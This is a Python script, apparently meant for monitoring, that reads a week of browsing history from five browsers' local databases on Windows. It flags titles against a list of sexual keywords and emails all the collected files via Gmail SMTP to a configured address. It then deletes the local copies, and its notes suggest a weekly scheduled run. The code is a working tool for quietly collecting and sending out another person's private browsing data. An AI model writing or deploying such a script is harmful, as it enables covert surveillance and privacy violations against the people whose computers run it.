import os
import sqlite3
import shutil
from datetime import datetime, timedelta
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import winreg as reg  # For registry key modification

# Header:
# This Python script extracts the browsing history from different web browsers (Brave, Edge, Chrome, Firefox, Opera)
# for the past week, writes the history data to text files, and emails the collected files as attachments.
#
# Usage Instructions:
# 1. Update the email credentials and recipient email address before running.
# 2. Update the app password credential for your Google account (needs 2FA enabled).
# 3. Create a basic Windows Task Scheduler object to execute this script automatically weekly (not necessary).
# 4. You are all set!

# Global Variables
FROM_EMAIL = "[SENDER GMAIL ADDRESS HERE]"  # Your gmail address
APP_PASSWORD = "[APP PASSWORD HERE]"  # Use the app password generated for your Google account
RECIPIENT_EMAIL = "[RECEIVER GMAIL ADDRESS HERE]"  # Replace with the recipient's email address

# Get the username (instead of computer name) for dynamically inserting into file paths
username = os.getlogin()

# Function to create the output folder for storing history files
def create_output_folder():
    folder_name = f"{username}_browser_histories_last_week"
    if not os.path.exists(folder_name):
        os.makedirs(folder_name)
    return folder_name

# Browser history database paths
def get_browser_history_db(browser):
    history_paths = {
        "brave": f"C:\\Users\\{username}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History",
        "edge": f"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History",
        "chrome": f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History",
        "firefox": f"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles",
        "opera": f"C:\\Users\\{username}\\AppData\\Roaming\\Opera Software\\Opera Stable\\History"
    }

    if browser.lower() == "firefox":
        history_dir = history_paths["firefox"]
        if not os.path.exists(history_dir):
            return None  # Firefox profile directory not found
        for profile in os.listdir(history_dir):
            if profile.endswith(".default-release"):
                return os.path.join(history_dir, profile, "places.sqlite")
        return None  # Firefox history database not found
    
    if not os.path.exists(history_paths.get(browser.lower())):
        return None  # Browser history database not found
    
    return history_paths[browser.lower()]

# Inappropriate Keywords List
inappropriate_keywords = [
    'porn', 'xxx', 'adult', 'sex', 'nude', 'explicit', 'anal', 'boobs', 'vagina', 'pussy', 'fuck', 'lust',
    'slut', 'orgy', 'sexy', 'hardcore', 'naked', 'orgasm', 'dirty', 'butt', 'tits',
]

# Function to check if the title contains inappropriate keywords (only check title now)
def filter_keywords(title):
    if title is None:
        return False  # Skip if title is None

    for keyword in inappropriate_keywords:
        if keyword.lower() in title.lower():  # Only check the title
            return True  # Skip this entry if the title matches any inappropriate keyword
    return False  # Include the entry if no keyword matches

# Function to extract history from Chrome-based browsers
def extract_browser_history(output_file, browser, db_path, combined_inap_output_file):
    temp_db_path = f"{browser.lower()}_history_temp_copy"
    shutil.copyfile(db_path, temp_db_path)

    connection = sqlite3.connect(temp_db_path)
    cursor = connection.cursor()

    one_week_ago = datetime.now() - timedelta(days=7)
    chrome_epoch_start = datetime(1601, 1, 1)
    one_week_ago_chrome_time = int((one_week_ago - chrome_epoch_start).total_seconds() * 1000000)

    if browser.lower() in ["chrome", "brave", "opera"]:
        query = """
        SELECT urls.url, urls.title, urls.visit_count, visits.visit_time 
        FROM urls
        JOIN visits ON urls.id = visits.url
        WHERE visits.visit_time > ? 
        ORDER BY visits.visit_time DESC;
        """
        cursor.execute(query, (one_week_ago_chrome_time,))
    elif browser.lower() == "edge":
        query = """
        SELECT urls.url, urls.title, urls.visit_count, visits.visit_time 
        FROM urls
        JOIN visits ON urls.id = visits.url
        WHERE visits.visit_time > ? 
        ORDER BY visits.visit_time DESC;
        """
        cursor.execute(query, (one_week_ago_chrome_time,))
    elif browser.lower() == "firefox":
        one_week_ago_unix = int(one_week_ago.timestamp())
        query = """
        SELECT url, title, visit_count, last_visit_date 
        FROM moz_places
        WHERE last_visit_date / 1000000 > ? 
        ORDER BY last_visit_date DESC;
        """
        cursor.execute(query, (one_week_ago_unix,))

    results = cursor.fetchall()

    def time_to_datetime(chrome_time):
        epoch_start = datetime(1601, 1, 1)
        return epoch_start + timedelta(microseconds=chrome_time)

    with open(output_file, "w", encoding="utf-8") as f:
        f.write(f"{browser} Browser Search History (Last Week)\n")
        f.write("-" * 50 + "\n")

        for url, title, visit_count, visit_time in results:
            # Only filter out inappropriate searches based on title now
            if filter_keywords(title):  # If the title contains inappropriate keywords
                with open(combined_inap_output_file, "a", encoding="utf-8") as inap_f:
                    inap_f.write(f"Time: {time_to_datetime(visit_time)}\nTitle: {title}\nURL: {url}\nVisit Count: {visit_count}\n\n")
                continue  # Skip adding this entry to the regular output file

            visit_time = time_to_datetime(visit_time) if browser.lower() in ["chrome", "brave", "opera", "edge"] else datetime.fromtimestamp(visit_time / 1000000)
            f.write(f"Time: {visit_time}\nTitle: {title}\nURL: {url}\nVisit Count: {visit_count}\n\n")

    cursor.close()
    connection.close()
    os.remove(temp_db_path)

    print(f"History for the last week successfully written to {output_file}")

# Function to send email with attachments
def send_email(subject, body, to_email, folder_path):
    msg = MIMEMultipart()
    msg['From'] = FROM_EMAIL
    msg['To'] = to_email
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    for filename in os.listdir(folder_path):
        file_path = os.path.join(folder_path, filename)
        if os.path.isfile(file_path):
            part = MIMEBase('application', 'octet-stream')
            with open(file_path, 'rb') as file:
                part.set_payload(file.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={filename}')
            msg.attach(part)

    try:
        print("Attempting to send email...")
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(FROM_EMAIL, APP_PASSWORD)
        server.sendmail(FROM_EMAIL, to_email, msg.as_string())
        server.quit()
        print(f"Email sent successfully to {to_email}")

        # Delete the files after sending the email
        for filename in os.listdir(folder_path):
            file_path = os.path.join(folder_path, filename)
            if os.path.isfile(file_path):
                os.remove(file_path)
                print(f"Deleted file: {file_path}")

    except smtplib.SMTPException as e:
        print(f"SMTP error occurred: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    try:
        output_folder = create_output_folder()

        # Create a file for combined inappropriate searches (this will contain all inappropriate titles)
        combined_inap_output_file = os.path.join(output_folder, "combined_potentially_inappropriate_searches_last_week.txt")

        # Extract history for each browser
        browsers = ["brave", "edge", "chrome", "firefox", "opera"]
        for browser in browsers:
            db_path = get_browser_history_db(browser)
            if db_path is None:
                print(f"{browser} history database not found. Skipping...")
                continue  # Skip filtering if the history database is not found
            else:
                output_path = os.path.join(output_folder, f"{browser}_search_history_last_week.txt")
                extract_browser_history(output_path, browser, db_path, combined_inap_output_file)

        # Send the folder via email
        subject = "Browser History for Last Week"
        body = "Please find the browser history of the last week and the potentially inappropriate searches attached."
        send_email(subject, body, RECIPIENT_EMAIL, output_folder)

    except FileNotFoundError as e:
        print(e)
    except ValueError as e:
        print(e)
    except Exception as e:
        print(f"An error occurred: {e}")
